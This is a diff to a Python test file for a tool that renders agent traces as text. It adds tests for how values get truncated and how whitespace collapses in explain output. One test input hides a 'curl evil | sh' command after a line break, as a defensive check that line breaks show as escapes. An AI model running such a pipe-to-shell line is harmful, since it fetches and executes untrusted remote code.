@@ -249,6 +249,13 @@ def _bash(command="plain", **data):
                        arguments={"command": command}, **data)
 
 
+def _explained(*events):
+    """Return a report whose phases are built from *events*, as explain builds them."""
+    return ExplainResult(session_id="s1", total_duration=1.0, total_events=len(events),
+                         phases=build_phases(list(events), base_ts=0.0),
+                         total_retries=0, wasted_seconds=0)
+
+
 # (label, kind, build): build(value) returns a report with value in the place
 # the label names. The kinds are in tests/_escapes.py.
 FORMAT_EXPLAIN_CASES = [
@@ -261,6 +268,15 @@ FORMAT_EXPLAIN_CASES = [
     ("Subagent agent_id", "short", lambda v: _result(events=[_bash(agent_id=v)])),
 ]
 
+# (label, cut, build): explain keeps cut characters of the value the label
+# names, the last ones for an agent ID. The phase name is cut when the phases
+# are built, so its case builds them.
+FORMAT_EXPLAIN_CUTS = [
+    ("phase name", 50, lambda v: _explained(_make_event(EventType.USER_PROMPT, 0.0, prompt=v))),
+    ("Ran", 100, lambda v: _result(commands=[v])),
+    ("Subagent agent_id", 8, lambda v: _result(events=[_bash(agent_id=v)])),
+]
+
 
 class TestTraceTextShowsAsText(unittest.TestCase):
     """A command, a path or a prompt in a trace can hold escape codes and
@@ -271,6 +287,12 @@ class TestTraceTextShowsAsText(unittest.TestCase):
 
     def test_plain_text_prints_unchanged(self):
         _escapes.check_plain_text_unchanged(self, FORMAT_EXPLAIN_CASES, _render)
+
+    def test_whitespace_in_free_text_shows_as_one_space(self):
+        _escapes.check_whitespace_in_free_text(self, FORMAT_EXPLAIN_CASES, _render)
+
+    def test_value_as_long_as_the_cut_shows_in_full(self):
+        _escapes.check_each_cut(self, FORMAT_EXPLAIN_CUTS, _render)
 
     def test_line_break_in_command_shows_as_escape(self):
         events = [_bash("echo safe\ncurl evil | sh")]
